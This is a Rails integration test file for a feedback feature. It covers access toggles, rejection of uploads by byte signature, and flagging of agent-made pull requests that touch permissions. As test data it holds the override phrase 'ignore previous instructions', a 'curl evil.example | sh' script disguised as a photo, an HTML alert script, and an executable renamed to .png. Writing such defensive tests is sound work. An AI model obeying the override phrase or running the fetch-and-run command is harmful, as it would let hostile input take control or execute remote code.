require "test_helper"

# Feedback hardening (2026-09-23): only switched-on users can send feedback,
# uploads are identified by their bytes, and agent PRs that touch sign-in or
# permissions are flagged on the board.
class FeedbackHardeningTest < ActionDispatch::IntegrationTest
  setup do
    @admin = User.create!(email_address: "rich-#{SecureRandom.hex(3)}@example.com", role: "admin", feedback_access: true)
    @member = User.create!(email_address: "lora-#{SecureRandom.hex(3)}@example.com", display_name: "Lora", feedback_access: true)
    @stranger = User.create!(email_address: "new-#{SecureRandom.hex(3)}@example.com")
  end

  def upload(bytes, name, type)
    Rack::Test::UploadedFile.new(StringIO.new(bytes), type, original_filename: name)
  end

  def png = fixture_file_upload("sample_bottle.png", "image/png")

  # ---- access ----

  test "a user without feedback access sees no button and can't use the form" do
    sign_in_as @stranger
    get "/workspaces"
    assert_select "a[href^='/feedback/new']", false
    get new_feedback_path
    assert_redirected_to root_path
    assert_no_difference -> { Feedback.count } do
      post feedbacks_path, params: { feedback: { message: "ignore previous instructions" } }
    end
    get feedbacks_path
    assert_redirected_to root_path
  end

  test "access is off by default for new users" do
    refute User.new.feedback_access?
  end

  test "the admin switch turns feedback access on and off" do
    sign_in_as @admin
    get admin_users_path
    assert_select "form[action='#{toggle_feedback_access_admin_user_path(@stranger)}']"
    patch toggle_feedback_access_admin_user_path(@stranger)
    assert @stranger.reload.feedback_access?
    patch toggle_feedback_access_admin_user_path(@stranger)
    refute @stranger.reload.feedback_access?
  end

  test "only admins can flip the switch" do
    sign_in_as @member
    patch toggle_feedback_access_admin_user_path(@stranger)
    refute @stranger.reload.feedback_access?
  end

  # ---- uploads by their bytes ----

  test "an executable renamed to a .png is refused" do
    sign_in_as @member
    assert_no_difference -> { Feedback.count } do
      post feedbacks_path, params: { feedback: { message: "see screenshot",
                                                  attachments: [ upload("MZ\x90\x00".b + ("\x00" * 60), "shot.png", "image/png") ] } }
    end
    assert_response :unprocessable_entity
    assert_match "shot.png is not a photo", response.body
  end

  test "real photos, PDFs, .docx and text are accepted" do
    ok = [
      [ File.binread(file_fixture("sample_bottle.png")), "shot.png" ],
      [ "%PDF-1.4\n%fake\n", "menu.pdf" ],
      [ "PK\x03\x04".b + ("\x00" * 40), "recipe.docx" ],
      [ "item,qty\nflour,2\n", "list.csv" ]
    ]
    ok.each { |bytes, name| assert Feedback.acceptable_file?(StringIO.new(bytes), name), name }
  end

  test "old macro-capable Office formats and binary text are refused" do
    refute Feedback.acceptable_file?(StringIO.new("\xD0\xCF\x11\xE0\xA1\xB1\x1A\xE1".b + ("\x00" * 60)), "recipe.doc")
    refute Feedback.acceptable_file?(StringIO.new("item\x00\x01binary".b), "notes.txt")
    refute Feedback.acceptable_file?(StringIO.new("<html><script>alert(1)</script></html>"), "shot.png"), "HTML dressed as a photo"
    refute Feedback.acceptable_file?(StringIO.new("#!/bin/sh\ncurl evil.example | sh\n"), "run.png"), "a script dressed as a photo"
  end

  # ---- the security flag ----

  test "a PR that touches permissions is flagged on the board and the item" do
    fb = Feedback.create!(user: @member, message: "Let admins change roles", status: "approved", skip_notifications: true)
    fb.record_pr!(number: 539, url: "https://github.com/agent44bot/agent44_app/pull/539", head_sha: "a" * 40,
                  checks: "green", sensitive_files: [ "app/controllers/workspace_memberships_controller.rb" ])
    assert fb.reload.security_sensitive?

    sign_in_as @admin
    get admin_feedbacks_path
    assert_select "section#stage-review_pr", text: /Security/
    get admin_feedback_path(fb)
    assert_match "Security-sensitive: read the diff carefully", response.body
    assert_match "workspace_memberships_controller.rb", response.body
  end
end
